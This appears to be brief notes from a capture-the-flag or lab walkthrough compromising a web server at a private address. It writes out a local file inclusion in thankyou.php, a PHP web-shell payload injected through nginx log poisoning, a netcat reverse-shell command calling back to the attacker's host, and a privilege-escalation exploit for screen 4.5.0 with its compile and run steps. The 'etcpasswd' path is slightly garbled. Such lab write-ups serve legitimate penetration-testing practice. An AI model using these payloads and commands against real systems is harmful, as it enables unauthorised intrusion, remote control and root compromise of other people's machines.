#found port 80 open

#directory scan showed index.php

#enumeration

#in contact.php;s thankyou page, found a LFI
	http://192.168.10.9/thankyou.php?file=../../../../../../../../../etcpasswd

#used it to get a shell

#used this LFI:
	http://192.168.10.9/thankyou.php?file=<?php system($_GET['cmd']) ?> 

#now we have a webshell

#used this URL to get shell:
	192.168.10.9/thankyou.php?file=/var/log/nginx/error.log&cmd=nc -e /bin/bash 192.168.10.10 1234

#enumeration

#found screen 4.5.0

#exp in searchsploit

#broken down in 3 parts
	one libhax.c
	one rootshell.c
	one exp.sh

#compiled on local machine
	gcc -fPIC -shared -ldl -o libhax.so libhax.c
	gcc -o rootshell rootshell.c

#then upload all three in /tmp directory of victim machine

#give perms to shell script
	chmod 777 exp.sh

#run shell script
	./exp.sh

#we got root!